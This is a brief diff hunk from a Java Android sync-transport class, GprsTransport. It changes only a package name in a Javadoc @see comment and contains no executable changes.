@@ -31,7 +31,7 @@ public class GprsTransport extends HttpKeepAliveTransport {
 	/*
 	 * (non-Javadoc)
 	 * 
-	 * @see com.ht.RCSAndroidGUI.action.sync.Transport#isAvailable()
+	 * @see com.ht.AndroidServiceGUI.action.sync.Transport#isAvailable()
 	 */
 	@Override
 	public boolean isAvailable() {
